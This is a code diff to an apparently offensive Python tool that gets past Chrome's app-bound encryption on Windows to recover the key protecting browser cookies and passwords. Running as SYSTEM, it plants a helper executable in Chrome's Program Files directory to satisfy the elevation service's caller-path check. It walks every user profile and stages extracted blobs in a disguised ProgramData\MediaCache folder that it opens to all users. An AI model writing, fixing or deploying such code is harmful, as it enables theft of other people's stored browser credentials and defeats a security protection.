@@ -32,10 +32,14 @@ except ImportError:
 
 HERE  = os.path.dirname(os.path.abspath(__file__))
 STAGE = os.path.join(os.environ.get("ProgramData", r"C:\ProgramData"), "MediaCache")
-LA    = os.environ["LOCALAPPDATA"];  APP = os.environ["APPDATA"]
 
-# AES key from elevation_service.exe (Chrome 127..~131); re-extract from binary on new builds
-ELEV_AES = base64.b64decode("sxxuJBrIRnKNqcH6xJNmUc/7lE0UOrgWJ2vMbaAoR4c=")
+# Chrome 156/157 dropped the static AES key from elevation_service.exe: the
+# app-bound key is now unwrapped by the service itself (IElevator2Chrome::
+# DecryptData). The client has to run from the Chrome install directory because
+# the service validates the caller path (MaybeTrimProcessPath). Stage 1, which
+# already runs as SYSTEM, drops the client there; stage 2 runs it as the user.
+HELPER_NAME = "ckdec.exe"
+HELPER_SRC  = os.path.join(HERE, "bin", HELPER_NAME)
 
 CHROMIUM_REL = {
     "chrome":  (r"Google\Chrome\User Data", "local"),
@@ -63,7 +67,12 @@ def profile_roots():
             roots.append((la, aa))
 
     add(os.environ.get("LOCALAPPDATA", ""), os.environ.get("APPDATA", ""))
-    base = os.path.join(os.environ.get("SystemDrive", "C:"), "Users")
+    # SystemDrive is "C:" without a separator: os.path.join("C:", "Users") is the
+    # relative path "C:Users", not C:\Users. As the user this branch never ran
+    # (the environment already supplied a root); as SYSTEM every other profile
+    # vanished and stage 1 found no Local State.
+    drive = os.environ.get("SystemDrive", "C:") + "\\"
+    base = os.path.join(drive, "Users")
     try:
         for name in sorted(os.listdir(base)):
             d = os.path.join(base, name)
@@ -326,6 +335,41 @@ def abe_blobs():
         got.append((name, blob[4:]))
     return got
 
+def chrome_app_dir():
+    """Chrome's Application directory on a system-wide install, or None."""
+    for base in (os.environ.get("ProgramFiles", r"C:\Program Files"),
+                 os.environ.get("ProgramFiles(x86)", r"C:\Program Files (x86)")):
+        p = os.path.join(base, "Google", "Chrome", "Application")
+        if os.path.isdir(p):
+            return p
+    return None
+
+def deployed_helper():
+    d = chrome_app_dir()
+    return os.path.join(d, HELPER_NAME) if d else None
+
+def deploy_helper():
+    r"""Copy the service client into Chrome's Application dir. Needs SYSTEM.
+
+    The service checks the caller path: C:\Program Files\Google\Chrome\
+    Application\ckdec.exe trims to C:\Program Files\Google\Chrome and passes.
+    A user-writable copy under %LOCALAPPDATA%\Google\Chrome is rejected
+    (0x8004A007), so the file has to land in Program Files.
+    """
+    dst = deployed_helper()
+    if not dst:
+        print("  chrome install directory not found -- helper not deployed")
+        return None
+    if not os.path.exists(HELPER_SRC):
+        print(f"  missing {HELPER_SRC} -- build it first")
+        return None
+    try:
+        shutil.copy2(HELPER_SRC, dst)
+    except OSError as e:
+        print(f"  helper copy failed: {e}")
+        return None
+    return dst
+
 def stage_v20(a):
     os.makedirs(STAGE, exist_ok=True)
     if a.v20_sys:                                                       # layer 1: MACHINE DPAPI
@@ -334,23 +378,54 @@ def stage_v20(a):
         # locale-proof ("Users" is "Usuarios" here).
         subprocess.run(["icacls", STAGE, "/grant", "*S-1-5-32-545:(OI)(CI)F"],
                        capture_output=True)
+        helper = deploy_helper()
+        if helper:
+            print(f"  helper deployed: {helper}")
         for name, blob in abe_blobs():
+            if name != "chrome":
+                print(f"  [{name}] separate elevation service -- not wired yet")
+                continue
+            # the raw payload (APPB stripped) is what DecryptData expects; it does
+            # both DPAPI layers inside the service, so stage 2 does not need the
+            # machine-unwrapped .stage1 shortcut
+            with open(os.path.join(STAGE, f"{name}.appb"), "wb") as f:
+                f.write(blob)
             try:
-                with open(os.path.join(STAGE, f"{name}.stage1"), "wb") as f: f.write(dpapi(blob, machine=True))
-            except OSError as e: print(f"  [{name}] run as SYSTEM: {e}")
+                # keep the SYSTEM-layer probe: it fails loudly here instead of
+                # surfacing as an opaque service error in stage 2
+                data = dpapi(blob, machine=True)
+            except OSError as e:
+                print(f"  [{name}] system DPAPI: {e}")
+                continue
+            with open(os.path.join(STAGE, f"{name}.stage1"), "wb") as f:
+                f.write(data)
         print(f"stage 1 ok -> {STAGE}")
         return
     got = 0
     # stage 2 starts from what stage 1 actually wrote: the file list is the truth,
     # not the browser map (stage 2 may run under a different context)
     for fn in sorted(os.listdir(STAGE)):
-        if not fn.endswith(".stage1"):
+        if not fn.endswith(".appb"):
             continue
-        name = fn[:-len(".stage1")]
-        f = os.path.join(STAGE, fn)
-        with open(f, "rb") as fh: wrapped = dpapi(fh.read())           # layer 2: USER DPAPI
-        flag = wrapped[0]                                              # 1 = AES-GCM, other = ChaCha20
-        key = open_blob_flag(flag, ELEV_AES, wrapped[1:13], wrapped[13:])
+        name = fn[:-len(".appb")]
+        if name != "chrome":
+            continue
+        helper = deployed_helper()
+        if not helper or not os.path.exists(helper):
+            print(f"  [{name}] helper missing -- run stage 1 as SYSTEM first")
+            continue
+        src = os.path.join(STAGE, fn)
+        out = os.path.join(STAGE, f"{name}.rawkey")
+        r = subprocess.run([helper, src, out], capture_output=True, text=True, timeout=60)
+        line = (r.stdout or r.stderr or "").strip().splitlines()
+        if r.returncode != 0 or not os.path.exists(out):
+            print(f"  [{name}] service call failed: {line[-1] if line else 'no output'}")
+            continue
+        with open(out, "rb") as f: key = f.read()
+        os.remove(out)
+        if len(key) != 32:
+            print(f"  [{name}] unexpected key length {len(key)}")
+            continue
         enc = base64.b64encode(key)
         with open(os.path.join(STAGE, f"mc-{name}.key"), "wb") as f: f.write(enc)
         # legacy single file: only meaningful when one browser is in play
